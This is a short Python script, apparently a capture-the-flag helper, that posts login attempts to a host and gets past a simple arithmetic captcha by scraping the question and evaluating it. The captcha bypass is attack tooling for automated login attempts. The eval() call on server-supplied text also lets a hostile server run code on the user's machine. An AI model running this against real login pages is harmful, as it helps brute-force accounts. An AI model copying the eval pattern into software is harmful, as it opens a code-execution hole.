import requests

class Ctf:
    def __init__(self, host):
        self.host = host
    
    def __solve_captcha(self, response):
        """
        Solves captcha
        """
        captcha_question = response.text.split("= ?")[0].split("<br>")[1].replace("\t", "").replace(" ", "")
        answer = eval(captcha_question)
        req_url = response.request.url
        req_data_str = response.request.body + "&captcha=" + str(answer)
        
        req_data = {}
        values = req_data_str.split("&")
        for val in values:
            name, data = val.split("=")
            req_data[name] = data
        
        response = requests.post(req_url, data=req_data)
        return response
    
    def send_login_req(self, username, password):
        """
        Sends login request to page, captcha bypassed
        """
        req_url = f"http://{self.host}:80/login"
        req_data = {"username": username, "password": password}

        response = requests.post(req_url, data=req_data)

        if 'Invalid captcha' in response.text:
            return self.__solve_captcha(response)
        else:
            return response